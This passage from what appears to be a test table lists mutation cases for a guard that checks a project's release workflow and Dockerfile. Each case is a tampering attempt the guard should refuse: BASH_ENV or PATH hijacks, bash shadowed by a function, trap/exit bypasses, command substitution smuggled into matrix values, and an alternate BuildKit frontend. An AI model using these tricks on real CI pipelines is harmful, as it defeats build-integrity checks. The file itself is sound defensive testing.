        REL_ASSERT, IND + "cat > /dev/null <<'EOF'\n" + REL_ASSERT + "\n" + IND + "EOF")]),
    "N02 assert inside a multi-line single-quoted string": ("fail", [_rel(REL_ASSERT, IND + ": '\n" + REL_ASSERT + "\n" + IND + "'")]),
    "N03 assert inside a function body never called": ("fail", [_rel(
        REL_ASSERT, IND + "skip_assert() {\n" + REL_ASSERT + "\n" + IND + "}")]),
    "N04 false && { assert }": ("fail", [_rel(REL_ASSERT, IND + "false && {\n" + REL_ASSERT + "\n" + IND + "}\n" + IND + ":")]),
    "N05 false && ( assert )": ("fail", [_rel(REL_ASSERT, IND + "false && (\n" + REL_ASSERT + "\n" + IND + ")")]),
    "N06 bash shadowed by a function": ("fail", _before_assert(IND + "bash() { :; }")),
    "N06b function keyword form": ("fail", _before_assert(IND + "function bash { :; }")),
    "N07 PATH reassigned before the assert": ("fail", _before_assert(IND + 'PATH="$PWD/fake:$PATH"')),
    "N08 cd elsewhere before the assert": ("fail", _before_assert(IND + "cd fake")),
    "N09 working-directory on the assert step": ("fail", _hdr_key(ASSERT_HDR, "working-directory: fake")),
    "N09b env on the assert step": ("fail", _hdr_key(ASSERT_HDR, "env:\n          SHELLOPTS: ''")),
    "N09c env BASH_ENV on the assert step": ("fail", _hdr_key(ASSERT_HDR, "env:\n          BASH_ENV: decoy/noop.sh")),
    "N10 job-level env BASH_ENV": ("fail", [_rel(JOB_NAME, JOB_NAME + "    env:\n      BASH_ENV: ./fake/env.sh\n")]),
    "N10b BASH_ENV in a comment is still refused": ("fail", [_rel(JOB_NAME, JOB_NAME + "    # BASH_ENV\n")]),
    "N11 folded run: > with a commented line before the assert": ("fail", [
        _rel(ASSERT_RUN, ASSERT_RUN.replace("run: |", "run: >")),
        _rel(REL_ASSERT, IND + "true #\n" + REL_ASSERT)]),
    "N12 alias plus expand_aliases": ("fail", _before_assert(IND + "shopt -s expand_aliases\n" + IND + "alias bash=true")),
    "N13 job-level if: false on the release job": ("fail", [_rel(JOB_NAME, JOB_NAME + "    if: ${{ false }}\n")]),
    "N13b job-level if after the steps": ("fail", [_rel(
        "\n  sbom:\n", "\n    if: ${{ false }}\n\n  sbom:\n")]),
    "N13c assert step lives in a job that is not the build job": ("fail", [_rel(ASSERT_NAME, _move_assert_to_other_job)]),
    "N13d job-level continue-on-error": ("fail", [_rel(JOB_NAME, JOB_NAME + "    continue-on-error: true\n")]),
    "N13e job-level defaults": ("fail", [_rel(JOB_NAME, JOB_NAME + "    defaults:\n      run:\n        working-directory: fake\n")]),
    "N13f job key written with quotes": ("fail", [_rel(JOB_NAME, JOB_NAME + '    "if": false\n')]),
    "N13g duplicate job key": ("fail", [_rel(JOB_NAME, JOB_NAME + JOB_NAME)]),
    "N13h top-level env": ("fail", [_rel("\njobs:\n", "\nenv:\n  PATH: ./fake\n\njobs:\n")]),
    "N13i top-level defaults": ("fail", [_rel("\njobs:\n", "\ndefaults:\n  run:\n    working-directory: fake\n\njobs:\n")]),
    "N13j top-level unsupported line": ("fail", [_rel("\njobs:\n", "\n? complex\n: key\n\njobs:\n")]),
    "N13k two jobs: keys": ("fail", [_rel("\njobs:\n", "\njobs:\n  extra:\n    runs-on: x\n\njobs:\n")]),
    "N13k2 no top-level jobs": ("fail", [_rel("\njobs:\n", "\n#jobs:\n")]),
    "N13l two release jobs": ("fail", [_rel("\n  sbom:\n", "\n  release:\n    runs-on: x\n\n  sbom:\n")]),
    "N13m assert step moved before the build": ("fail", [_rel(ASSERT_NAME, _move_assert_before_build)]),
    "N13n assert step deleted": ("fail", [_rel(ASSERT_NAME, _drop_assert_step)]),
    "N14 hash -p shadows bash": ("fail", _before_assert(IND + "hash -p /usr/bin/true bash")),
    "N14b exec before the assert": ("fail", _before_assert(IND + "exec true")),
    "N15 assert step rewrites the declaration": ("fail", [_rel(
        IND + ALLOWED_REQUIRE, IND + "sed -i.bak s/,sal-postgres// scripts/release-features.sh\n" + IND + ALLOWED_REQUIRE)]),
    "N16 extra statement after the assert": ("fail", [_rel(REL_ASSERT, REL_ASSERT + "\n" + IND + "true")]),
    "N16b statements reordered": ("fail", [_rel(
        BIN_LINE + "\n" + IND + ALLOWED_REQUIRE, IND + ALLOWED_REQUIRE + "\n" + BIN_LINE)]),
    "N17 comment line inside a continuation hides the assert": ("fail", [_rel(
        REL_ASSERT, IND + "echo hi \\\n" + IND + "# x \\\n" + REL_ASSERT)]),
    "N18 step key written as a flow mapping": ("fail", [_rel(ASSERT_HDR, ASSERT_NAME + "        {shell: bash}\n")]),
    "N19 run block with inconsistent indentation": ("fail", [_rel(
        IND + "set -euo pipefail\n" + BIN_LINE, IND + "set -euo pipefail\n" + "         " + ALLOWED_BIN)]),
    "N20 duplicate step key": ("fail", _hdr_key(ASSERT_HDR, "shell: bash")),
    "N21 extra step key": ("fail", _hdr_key(ASSERT_HDR, "timeout-minutes: 5")),
    "N22 inline run value": ("fail", [_rel(ASSERT_RUN, ASSERT_HDR + "        run: " + ASSERT_WORKFLOW + "\n" + "          true\n")]),
    "N23 step carries only the first key as a dash line with extra spaces": ("fail", [_rel(
        ASSERT_NAME, "      -   name: Assert compiled features\n")]),
    # --- R1 / F2: the assert is pinned to the release binary
    "R1 assert targets another binary": ("fail", [_rel(REL_ASSERT, REL_ASSERT.replace('"$bin"', '"$bin.checked"'))]),
    "R1 assert targets /bin/ls": ("fail", [_rel(REL_ASSERT, REL_ASSERT.replace('"$bin"', "/bin/ls"))]),
    "R1 bin assigned from another path": ("fail", [_rel(BIN_LINE, IND + 'bin="/opt/known-good/ai-memory"')]),
    "R1 bin reassigned before the assert": ("fail", _before_assert(IND + "bin=/bin/ls")),
    "R1 Dockerfile assert targets another binary": ("fail", [(
        DOCKER, "assert-compiled-features.sh target/release/ai-memory", "assert-compiled-features.sh /bin/ls", False)]),
    "assert without --strict (release.yml)": ("fail", [_rel(REL_ASSERT, REL_ASSERT.replace("--strict ", ""))]),
    "assert with a literal --require instead of $REQUIRE_FLAGS": ("fail", [_rel(
        REL_ASSERT, REL_ASSERT.replace("$REQUIRE_FLAGS", "--require sal"))]),
    "Dockerfile assert not strict": ("fail", [(DOCKER, "--strict $REQUIRE_FLAGS", "$REQUIRE_FLAGS", False)]),
    "assert removed (release.yml)": ("fail", [_rel(REL_ASSERT, IND + "true")]),
    "Dockerfile has no assert": ("fail", [(DOCKER, DOCKER_ASSERT, "    true", False)]),
    # --- R4 / F1: a skippable assert (and build / SBOM)
    "strict assert skipped behind a shell if": ("fail", [_rel(
        REL_ASSERT, IND + 'if [[ "$bin" != *x86_64-apple-darwin* ]]; then\n' + REL_ASSERT + "\n" + IND + "fi")]),
    "R4 step-level if: on the assert step": ("fail", _hdr_key(ASSERT_NAME, "if: matrix.target != 'x86_64-apple-darwin'")),
    "R4 continue-on-error on the assert step": ("fail", _hdr_key(ASSERT_NAME, "continue-on-error: true")),
    "R4 step-level if: on the build step": ("fail", _hdr_key(BUILD_HDR, "if: matrix.os != 'macos-latest'")),
    "R4 continue-on-error on the SBOM step": ("fail", _hdr_key(SBOM_HDR, "continue-on-error: true")),
    "R4 non-bash shell on the assert step": ("fail", [_rel(ASSERT_HDR, ASSERT_HDR.replace("shell: bash", "shell: sh"))]),
    "R4 non-bash shell on the build step": ("fail", [_rel(BUILD_SHELL, BUILD_SHELL.replace("shell: bash", "shell: sh"))]),
    "R4 assert || true": ("fail", [_rel(REL_ASSERT, REL_ASSERT + " || true")]),
    "R4 assert followed by || on the next line": ("fail", [_rel(REL_ASSERT, REL_ASSERT + " ||\n" + IND + "true")]),
    "R4 build || true": ("fail", [_rel(REL_BUILD_CMD, REL_BUILD_CMD + " || true")]),
    "R4 SBOM || true": ("fail", [_rel(SBOM_LINE, SBOM_LINE + " || true")]),
    "R4 build piped to tee": ("fail", [_rel(REL_BUILD_CMD, REL_BUILD_CMD + " | tee build.log")]),
    "R4 SBOM in the background": ("fail", [_rel(SBOM_LINE, SBOM_LINE + " &")]),
    "R4 one-line test && assert": ("fail", [_rel(REL_ASSERT, IND + '[[ "$bin" != *x86_64-apple-darwin* ]] && ' + ASSERT_WORKFLOW)]),
    "R4 one-line test || assert": ("fail", [_rel(REL_ASSERT, IND + "false || " + ASSERT_WORKFLOW)]),
    "R4 assert piped to cat": ("fail", [_rel(REL_ASSERT, REL_ASSERT + " | cat")]),
    "R4 assert in the background": ("fail", [_rel(REL_ASSERT, REL_ASSERT + " &")]),
    "R4 set +e before the assert": ("fail", _before_assert(IND + "set +e")),
    "R4 trap before the assert": ("fail", _before_assert(IND + "trap 'exit 0' ERR")),
    "R4 exit 0 before the assert": ("fail", _before_assert(IND + "exit 0")),
    "R4 build inside an if": ("fail", [_rel(REL_BUILD_CMD, IND + "if true; then\n" + REL_BUILD_CMD + "\n" + IND + "fi")]),
    "R4 Dockerfile conditional assert": ("fail", [(
        DOCKER, DOCKER_ASSERT, '    if [ -n "${SKIP:-}" ]; then :; else ' + ASSERT_DOCKER + "; fi", False)]),
    "R4 Dockerfile assert || true": ("fail", [(DOCKER, DOCKER_ASSERT, DOCKER_ASSERT + " || true", False)]),
    "R4 Dockerfile set +e": ("fail", [(DOCKER, '    test -n "$FEATURES"; \\', '    set +e; \\\n    test -n "$FEATURES"; \\', False)]),
    "C09 later step cargo +toolchain build of the matrix target": ("fail", [_rel(
        PKG_HDR, "      - name: x\n        run: cargo +1.98.0 build --release --target ${{ matrix.target }}\n" + PKG_HDR, False)]),
    "C09b later step repeats the allowed build line": ("fail", [_rel(
        PKG_HDR, "      - name: x\n        run: " + BUILD_CMD + "\n" + PKG_HDR, False)]),
    "C09c later step rebuilds with different flags": ("fail", [_rel(
        PKG_HDR, "      - name: x\n        run: cargo build --release --target ${{ matrix.target }}\n" + PKG_HDR, False)]),
    "C09d second RUN with a cargo build in the Dockerfile": ("fail", [(
        DOCKER, DOCKER_RUN_HEAD, "RUN cargo build --release\n" + DOCKER_RUN_HEAD, False)]),
    # --- Dockerfile: the build RUN is one exact instruction
    "N-D1 Dockerfile assert in a function never called": ("fail", [(
        DOCKER, DOCKER_ASSERT, "    f() { " + ASSERT_DOCKER + "; }", False)]),
    "N-D2 Dockerfile bash shadowed by a function": ("fail", [(
        DOCKER, 'FEATURES="$(bash scripts/release-features.sh)"; \\', "bash() { :; }; \\\n    " + ALLOWED_FEATURES + "; \\", False)]),
    "N-D3 Dockerfile SHELL instruction before the RUN": ("fail", [(DOCKER, DOCKER_RUN_HEAD, 'SHELL ["/bin/true"]\n' + DOCKER_RUN_HEAD, False)]),
    "N-D3b Dockerfile lowercase shell instruction": ("fail", [(DOCKER, DOCKER_RUN_HEAD, 'shell ["/bin/true"]\n' + DOCKER_RUN_HEAD, False)]),
    "N-D4 Dockerfile ENV BASH_ENV": ("fail", [(DOCKER, DOCKER_RUN_HEAD, "ENV BASH_ENV=/build/noop.sh\n" + DOCKER_RUN_HEAD, False)]),
    "N-D5 Dockerfile RUN is not the only statement list": ("fail", [(DOCKER, "strip target/release/ai-memory", "true", False)]),
    "N-D6 Dockerfile RUN with a trailing comment": ("fail", [(DOCKER, DOCKER_ASSERT, DOCKER_ASSERT + "  # strict", False)]),
    "N-D7 Dockerfile RUN comment line inside the continuation": ("fail", [(
        DOCKER, '    test -n "$FEATURES"; \\', '    # note \\\n    test -n "$FEATURES"; \\', False)]),
    "N-D8 Dockerfile RUN uses --mount": ("fail", [(DOCKER, DOCKER_RUN_HEAD, "RUN --mount=type=cache,target=/x set -eu; \\\n", False)]),
    "Dockerfile does not COPY Cargo.lock": ("fail", [(DOCKER, "COPY Cargo.toml Cargo.lock", "COPY Cargo.toml", False)]),
    "Dockerfile does not COPY the declaration": ("fail", [(
        DOCKER, "COPY scripts/release-features.sh", "COPY scripts/assert-compiled-features.sh", False)]),
    # --- F3: the matrix build must exist as a real build step
    "F3 release.yml matrix build deleted (the SBOM step remains)": ("fail", [_rel(REL_BUILD_CMD, IND + "true")]),
    "F3 matrix build respelled as the cargo b alias": ("fail", [_rel(REL_BUILD_CMD, REL_BUILD_CMD.replace("cargo build", "cargo b"))]),
    # --- declaration / SBOM / proof / docs
    "declaration without sal-postgres": ("fail", [(DECL, "BUILD_FEATURES=(sal sal-postgres)", "BUILD_FEATURES=(sal)", False)]),
    "declaration exits non-zero": ("fail", [(
        DECL, "(IFS=,; printf '%s\\n' \"${BUILD_FEATURES[*]}\")", "(IFS=,; printf '%s\\n' \"${BUILD_FEATURES[*]}\"); exit 3", False)]),
    "no SBOM": ("fail", [_rel(SBOM_LINE, IND + "echo nosbom")]),
    "SBOM without --features": ("fail", [_rel(SBOM_LINE, IND + "cargo cyclonedx --format json")]),
    "SBOM step carries an if": ("fail", _hdr_key(SBOM_HDR, "if: github.event_name == 'never'")),
    "release-shape does not read the declaration": ("fail", [
        (SHAPE, SHAPE_BUILD_CMD, "true", False),
        (SHAPE, "scripts/release-features.sh", "scripts/x.sh", True)]),
    "release-shape build with a hard-coded feature list": ("fail", [(SHAPE, SHAPE_BUILD_CMD, "cargo build --locked --release --features sal", False)]),
    "release-shape build step carries continue-on-error": ("fail", [(SHAPE, SHAPE_HDR, SHAPE_HDR + "        continue-on-error: true\n", False)]),
    "release-shape does not run the pg proof": ("fail", [(SHAPE, "scripts/release-shape-pg-proof.sh", "scripts/x.sh", True)]),
    "INSTALL does not name sal-postgres": ("fail", [(INSTALL, "sal-postgres", "sal-x", True)]),
    "INSTALL says the daemon path is a source build": ("fail", [(
        INSTALL, "## Pre-built Binaries\n", "## Pre-built Binaries\n\nThe daemon path is NOT shipped.\n", False)]),
    # --- missing inputs are a guard failure (never a silent pass)
    "L1 scripts/release-features.sh is missing": ("fail", [(DECL, "", None, False)]),
    "L1 release.yml is missing": ("fail", [(REL, "", None, False)]),
    "L1 Dockerfile is missing": ("fail", [(DOCKER, "", None, False)]),
    "L1 release-shape.yml is missing": ("fail", [(SHAPE, "", None, False)]),
    "L1 docs/INSTALL.md is missing": ("fail", [(INSTALL, "", None, False)]),
    "L1 c8-precheck.yml is missing": ("fail", [(C8, "", None, False)]),
    "L1 publish-ci-image.yml is missing": ("fail", [(PUBLISH, "", None, False)]),
    # Round-2 cells (#8023): one per refusal site the #6289 / #6290 / #6904 / #8002 / #8020 fixes add.
    "N1 root job preflight gains needs is refused": ("fail", [
        _rel("", _job_edit("preflight", lambda b: b.replace("  preflight:\n", "  preflight:\n    needs: qualify\n", 1)))]),
    "N2 homebrew needs drops release is refused": ("fail", [
        _rel("", _job_edit("homebrew", lambda b: b.replace("needs: [preflight, qualify, release]", "needs: [preflight, qualify]", 1)))]),
    "N3 release.yml preflight uses repointed to a tag is refused": ("fail", [
        _rel("", _job_edit("preflight", _first_use_to_tag))]),
    "N11 release.yml crates-io uses repointed to a tag is refused": ("fail", [
        _rel("", _job_edit("crates-io", _first_use_to_tag))]),
    "N4 release-shape.yml uses repointed to a tag is refused": ("fail", [(SHAPE, "", _first_use_to_tag, False)]),
    "N5 c8-precheck.yml uses repointed to a tag is refused": ("fail", [(C8, "", _first_use_to_tag, False)]),
    "N6 publish-ci-image.yml uses repointed to a tag is refused": ("fail", [(PUBLISH, "", _first_use_to_tag, False)]),
    "N7 release-shape holds a non-mapping step is refused": ("fail", [(SHAPE, "", _shape_scalar_step, False)]),
    "N8 release-shape step appended is refused": ("fail", [
        (SHAPE, "", lambda x: x.rstrip("\n") + "\n\n      - name: x\n        run: echo\n", False)]),
    "N10 release-shape guard step gains if: false is refused": ("fail", [
        _shape("      - name: Release feature declaration guard\n",
               "      - name: Release feature declaration guard\n        if: false\n")]),
    # Round-3 cells (#8030): the per-action *_USES comparison, one cell per workflow.
    "N12 release.yml preflight checkout repinned to another sha is refused": ("fail", [
        _rel("", _job_edit("preflight", _first_checkout_to_other_sha))]),
    "N13 release.yml crates-io checkout repinned to another sha is refused": ("fail", [
        _rel("", _job_edit("crates-io", _first_checkout_to_other_sha))]),
    "N14 release-shape.yml checkout repinned to another sha is refused": ("fail", [
        (SHAPE, "", _first_checkout_to_other_sha, False)]),
    "N15 c8-precheck.yml checkout repinned to another sha is refused": ("fail", [
        (C8, "", _first_checkout_to_other_sha, False)]),
    "N16 publish-ci-image.yml checkout repinned to another sha is refused": ("fail", [
        (PUBLISH, "", _first_checkout_to_other_sha, False)]),
    "N17 c8-precheck.yml holds a value outside the subset grammar is refused": ("fail", [
        (C8, "", lambda x: x.rstrip("\n") + '\n\nx-extra: "abc\n', False)]),
    # Round-5 cells (F1): the per-action comparison is on the case-folded owner/repo with any subpath kept.
    "N18 crates-io checkout spelled with another case and another sha is refused": ("fail", [
        _rel("", _job_edit("crates-io", _checkout_spelled("Actions/Checkout")))]),
    "N19 crates-io checkout with a subpath and another sha is refused": ("fail", [
        _rel("", _job_edit("crates-io", _checkout_spelled("actions/checkout/sub")))]),
    "N20 crates-io checkout with a dot segment is refused": ("fail", [
        _rel("", _job_edit("crates-io", _checkout_spelled("actions/checkout/..", CHECKOUT_USES.partition("@")[2])))]),
    "N21 crates-io checkout spelled with another case and the pinned sha passes": ("pass", [
        _rel("", _job_edit("crates-io", _checkout_spelled("ACTIONS/Checkout", CHECKOUT_USES.partition("@")[2])))]),
    # --- control characters: Python and bash disagree on what a line is
    "control character: CR line ends in release.yml": ("fail", [_rel(REL_ASSERT, REL_ASSERT + "\r")]),
    "control character: form feed in the Dockerfile": ("fail", [(DOCKER, DOCKER_ASSERT, DOCKER_ASSERT + "\x0c# x", False)]),
    "control character: NUL in release.yml": ("fail", [_rel(REL_ASSERT, REL_ASSERT + "\x00")]),
    # --- F5: unreadable input exits 2
    "F5 release.yml is not valid UTF-8": ("input-error", [(REL, "", "\udcff\udcfe\n", False)]),
    "F5 Dockerfile is not valid UTF-8": ("input-error", [(DOCKER, "", "\udcff\udcfe\n", False)]),
    # --- #4719 SR-1/H1/M1: structural location, exact indentation (YAML subset)
    "SR1 trailing tab after the assert statement": ("fail", [_rel(REL_ASSERT, REL_ASSERT + "\t")]),
    "SR1/J1 job key at indent 5 (multi-line scalar or stray key)": ("fail", [_rel(JOB_NAME, JOB_NAME + "     if: false\n")]),
    "SR1/J2 continuation line of a plain job name": ("fail", [_rel(JOB_NAME, JOB_NAME + "      continued\n")]),
    "SR1 step-level key written with quotes": ("fail", [_rel(REL_ASSERT, REL_ASSERT + "\n        \"if\": false")]),
    "SR1 anchor on a job value": ("fail", [_rel(NEEDS_REL, NEEDS_REL.replace("needs: [", "needs: &n ["))]),
    "SR1 alias as a job value": ("fail", [_rel(NEEDS_REL, NEEDS_REL + "    timeout-minutes: *n\n")]),
    "SR1 tag on a job value": ("fail", [_rel(NEEDS_REL, NEEDS_REL.replace("needs: [", "needs: !!seq ["))]),
    "SR1 flow mapping value": ("fail", [_rel(NEEDS_REL, NEEDS_REL + "    env: {A: b}\n")]),
    "SR1 multi-line double-quoted value": ("fail", [_rel(JOB_NAME, '    name: "Release\n      x"\n')]),
    "SR1 block indentation indicator": ("fail", [_rel(JOB_NAME, "    name: |2\n      Release\n")]),
    "SR1 sequence line more indented than its items": ("fail", [_rel(PKG_HDR, "       - name: stray\n" + PKG_HDR)]),
    "SR1/J3 block scalar as the job name": ("fail", [_rel(JOB_NAME, "    name: |\n      Release (${{ matrix.target }})\n")]),
    "SR1/J3 folded block as a step if": ("fail", _hdr_key(ASSERT_NAME, "if: >-\n          true")),
    "SR1 release job runs-on changed": ("fail", [_rel(NEEDS_REL, NEEDS_REL.replace("${{ matrix.os }}", "self-hosted"))]),
    "SR1 release job if: (skips the job)": ("fail", [_rel(JOB_NAME, JOB_NAME + "    if: false\n")]),
    "SR1 release job container:": ("fail", [_rel(JOB_NAME, JOB_NAME + "    container: decoy:latest\n")]),
    "SR1 a step is a plain scalar, not a mapping": ("fail", [_rel(PKG_HDR, "      - echo hi\n" + PKG_HDR)]),
    "SR1 build step name carries an expression": ("fail", [_rel(BUILD_HDR, BUILD_HDR.replace("binary", "binary ${{ matrix.os }}"))]),
    "SR1 run: |- on the assert step": ("fail", [_rel(ASSERT_RUN, ASSERT_RUN.replace("run: |", "run: |-"))]),
    "SR1 jobs: is not a mapping": ("fail", [_rel("\njobs:\n", "\njobs: []\nx-jobs:\n")]),
    "valid: comment lines inside the release job and a matrix entry": ("pass", [_rel(
        NEEDS_REL, NEEDS_REL + "    # a comment\n"), _rel(ENTRY1, ENTRY1.replace("            os:", "            # c\n            os:"))]),
    # --- #4719 SR-2/H2: matrix values substituted into the pinned units
    "SR2 strategy fail-fast: true": ("fail", [_rel(MATRIX_FF, "      fail-fast: true\n")]),
    "SR2 matrix gains an axis": ("fail", [_rel(MATRIX_FF + "      matrix:\n", MATRIX_FF + "      matrix:\n        x: [a]\n")]),
    "SR2 matrix entry gains a key": ("fail", [_rel(ENTRY1, ENTRY1 + "            runner: x\n")]),
    "SR2/J4 artifact quoted": ("fail", [_rel(ENTRY1, ENTRY1.replace("artifact: ai-memory", "artifact: 'ai-memory'"))]),
    "SR2/J4 artifact carries shell": ("fail", [_rel(ENTRY1, ENTRY1.replace("artifact: ai-memory", "artifact: ai-memory;true"))]),
    "SR2/J4 target carries a substitution": ("fail", [_rel(
        ENTRY1, ENTRY1.replace("x86_64-unknown-linux-gnu", "x86_64-unknown-linux-gnu$(true)"))]),
    "SR2/J4 os is an expression": ("fail", [_rel(ENTRY1, ENTRY1.replace("ubuntu-latest", "${{ github.event.inputs.tag }}"))]),
    "SR2 a valid target outside the pinned set": ("fail", [_rel(
        ENTRY1, ENTRY1.replace("x86_64-unknown-linux-gnu", "riscv64gc-unknown-linux-gnu"))]),
    "SR2 a matrix entry dropped": ("fail", [_rel(ENTRY1 + "            nfpm_arch: amd64\n", "")]),
    # --- #4719 L1: no other building cargo in the release job
    "L1/J6 cargo -q build in a later release step": ("fail", _step_before_pkg("        run: cargo -q build --release\n")),
    "L1/J6 CARGO build (case-insensitive file system)": ("fail", _step_before_pkg("        run: CARGO build --release\n")),
    "L1/J6 cargo --config before the subcommand": ("fail", _step_before_pkg("        run: cargo --config x=y build\n")),
    "L1/J6 cross build in a later step": ("fail", _step_before_pkg("        run: |\n          cross build --release\n")),
    "L1/J6 rustc in a later step": ("fail", _step_before_pkg("        run: rustc -O src/main.rs\n")),
    "L1/J6 a cargo action in a later step": ("fail", _step_before_pkg("        uses: actions-rs/cargo@v1\n")),
    "L1 second matrix-target build in another job": ("fail", [_rel(
        SBOM_HDR, "      - name: x\n        run: cargo build --target ${{ matrix.target }}\n" + SBOM_HDR)]),
    "L1 image build picks another stage": ("fail", [_rel(PUSH_WITH, PUSH_WITH + "          target: builder\n")]),
    # --- #4719 L6: the SBOM unit lives in the sbom: job
    "L6/J5 SBOM step moved to a decoy job": ("fail", [_rel(SBOM_HDR, _move_sbom_to_decoy)]),
    "L6/J5 SBOM copied into a decoy job": ("fail", [_rel(
        SBOM_HDR, _append_job("      - name: x\n        run: cargo cyclonedx --format json --features sal\n"))]),
    "L6 sbom job carries an if": ("fail", [_rel(SBOM_JOB, SBOM_JOB + "    if: false\n")]),
    "release-shape build job renamed": ("fail", [(SHAPE, SHAPE_JOB_HDR, "\n  release-shape-x:\n", False)]),
    # --- #4719 SR-3/M2: Dockerfile directives, heredocs, stage chain
    "SR3 syntax directive changed": ("fail", [_docker(DOCKER_SYNTAX + "\n", "# syntax=docker/dockerfile:1.7\n")]),
    "SR3 escape directive": ("fail", [_docker(DOCKER_SYNTAX + "\n", DOCKER_SYNTAX + "\n# escape=`\n")]),
    "SR3 heredoc RUN in the final stage": ("fail", [_docker(D_BIN, D_BIN + "RUN cat <<<x\n")]),
    "SR3 ONBUILD instruction": ("fail", [_docker(D_BIN, D_BIN + "ONBUILD RUN true\n")]),
    "SR3 unknown instruction": ("fail", [_docker(D_BIN, D_BIN + "BOGUS x\n")]),
    "SR3 instruction before the first FROM": ("fail", [_docker(D_BUILDER, "ENV X=1\n" + D_BUILDER)]),
    "SR3 FROM outside the subset": ("fail", [_docker(D_FINAL, "FROM busybox junk AS dead\n" + D_FINAL)]),
    "SR3 stage FROM an earlier stage": ("fail", [_docker(D_FINAL, "FROM builder AS other\n" + D_FINAL)]),
    "SR3 duplicate stage name": ("fail", [_docker(D_FINAL, "FROM busybox AS builder\n" + D_FINAL)]),
    "SR3 binary copied twice": ("fail", [_docker(D_BIN, D_BIN + D_BIN)]),
    "SR3 final stage takes another --from": ("fail", [_docker(D_BIN, D_BIN + "COPY --from=busybox /bin/sh /bin/sh2\n")]),
    "SR3 binary copied from an image, not a stage": ("fail", [_docker(D_BIN, D_BIN.replace("=builder", "=rust:1.98"))]),
    "SR3 builder takes a --from": ("fail", [_docker(D_WORKDIR, D_WORKDIR + "COPY --from=busybox /bin/sh /bin/sh\n")]),
    "SR3/D1 dead stage holds the canonical RUN, shipped builder altered": ("fail", [_docker(D_BUILDER, _dead_stage_then_alter)]),
    "SR3 cargo fetch in the builder before the canonical RUN": ("fail", [_docker(D_LOCK, D_LOCK + "RUN cargo fetch\n")]),
    "SR3 instruction between the declaration COPY and the RUN": ("fail", [_docker(DOCKER_RUN_HEAD, "ENV X=1\n" + DOCKER_RUN_HEAD)]),
    "SR3 build dropped from the builder RUN (no build tool left)": ("fail", [_docker(DOCKER_BUILD, "true; \\")]),
    "SR3 RUN appended after the canonical RUN": ("fail", [_docker(D_FINAL, "RUN true\n" + D_FINAL)]),
    # --- #4719 L2: non-ASCII spaces and zero-width characters are refused, never folded
    "L2/D2 NBSP inside the build statement": ("fail", [_rel(REL_BUILD_CMD, REL_BUILD_CMD.replace("cargo build", "cargo\u00a0build"))]),
    "L2/D3 em space in the Dockerfile RUN": ("fail", [_docker(DOCKER_ASSERT, DOCKER_ASSERT.replace(" --strict", "\u2003--strict"))]),
    "L2 zero-width space in release-shape.yml": ("fail", [(SHAPE, SHAPE_BUILD_CMD, SHAPE_BUILD_CMD.replace("cargo", "car\u200bgo"), False)]),
    "L2 bare CR inside a comment line (a YAML line break) hides a job key": ("fail", [_rel(
        JOB_NAME, JOB_NAME + "    # note\r    if: false\n")]),
    "L2 U+2028 inside a comment line (a YAML 1.1 line break) hides a job key": ("fail", [_rel(
        JOB_NAME, JOB_NAME + "    # note\u2028    if: false\n")]),
    "L2 byte-order mark at the start of release.yml": ("fail", [_rel(JOB_NAME, lambda t: "\ufeff" + t)]),
    # --- #4719 review round 2 (F1/SR-4): the image build is an allowlist
    "IB file: on the image build": ("fail", [_rel(PUSH_WITH, PUSH_WITH + "          file: Dockerfile.alt\n")]),
    "IB context other than the repository root": ("fail", [_rel(PUSH_WITH, PUSH_WITH.replace("context: .", "context: ./deploy"))]),
    "IB with: is a scalar": ("fail", [_rel(BUILD_IMG_NAME, _image_with_scalar)]),
    "IB context missing": ("fail", [_rel(PUSH_WITH, "        with:\n")]),
    "IB with: missing": ("fail", [_rel(BUILD_IMG_NAME, _drop_image_with)]),
    "IB build-contexts replaces the builder stage": ("fail", [_rel(
        PUSH_WITH, PUSH_WITH + "          build-contexts: builder=docker-image://alpine\n")]),
    "IB build-args overrides the frontend": ("fail", [_rel(
        PUSH_WITH, PUSH_WITH + "          build-args: BUILDKIT_SYNTAX=ghcr.io/x/frontend\n")]),
    "IB platforms added": ("fail", [_rel(PUSH_WITH, PUSH_WITH + "          platforms: linux/riscv64\n")]),
    "IB owner/action in another case": ("fail", [_rel(PUSH_USES, PUSH_USES.replace("docker/build-push", "Docker/Build-Push"))]),
    "IB uses spelled with a YAML escape": ("fail", [_rel(
        PUSH_USES, '        uses: "\\x64ocker/build-push-action@10e90e3645eae34f1e60eeb005ba3a3d33f178e8"\n')]),
    "IB uses double-quoted (no escape)": ("fail", [_rel(PUSH_USES, PUSH_USES.replace(IMAGE_BUILD_USES, '"' + IMAGE_BUILD_USES + '"'))]),
    "IB uses single-quoted": ("fail", [_rel(PUSH_USES, PUSH_USES.replace(IMAGE_BUILD_USES, "'" + IMAGE_BUILD_USES + "'"))]),
    "IB uses pinned to another commit": ("fail", [_rel(PUSH_USES, PUSH_USES.replace("10e90e36", "00000000"))]),
    "IB uses swapped for another image builder": ("fail", [_rel(PUSH_USES, "        uses: int128/kaniko-action@v1\n")]),
    "IB step id changed": ("fail", [_rel("        id: build\n", "        id: image\n")]),
    "IB step carries env": ("fail", [_rel(PUSH_USES, PUSH_USES + "        env:\n          DOCKER_BUILDKIT: '0'\n")]),
    "IB step carries if": ("fail", [_rel(PUSH_USES, PUSH_USES + "        if: false\n")]),
    "IB step name carries an expression": ("fail", [_rel(BUILD_IMG_NAME, "      - name: Build ${{ github.actor }}\n")]),
    "IB push value changed": ("fail", [_rel("push: ${{ github.event.inputs.dry_run == 'false' }}", "push: true")]),
    "IB push value quoted": ("fail", [_rel("push: ${{ github.event.inputs.dry_run == 'false' }}",
                                          "push: '${{ github.event.inputs.dry_run == ''false'' }}'")]),
    "IB tags changed": ("fail", [_rel(PUSH_TAGS, PUSH_TAGS + "            ghcr.io/other/ai-memory:latest\n")]),
    "IB labels changed": ("fail", [_rel(PUSH_LABELS, PUSH_LABELS + "            extra=1\n")]),
    "IB cache-from changed": ("fail", [_rel("cache-from: type=gha", "cache-from: type=registry,ref=x/y")]),
    "IB cache-to changed": ("fail", [_rel("cache-to: type=gha,mode=max", "cache-to: type=gha")]),
    "IB second image build in the docker job": ("fail", [_rel(BUILD_IMG_NAME, _second_image_build)]),
    "IB image build moved to the sbom job": ("fail", [_rel(BUILD_IMG_NAME, _image_build_in_sbom_job)]),
    "IB image build copied into the sbom job": ("fail", [_rel(BUILD_IMG_NAME, _image_build_copy_in_sbom_job)]),
    "IB image build step deleted": ("fail", [_rel(BUILD_IMG_NAME, lambda t: t.replace(_image_step(t), "", 1))]),
    "IB docker build in a docker-job run step": ("fail", _docker_extra_step("        run: docker build -t x .\n")),
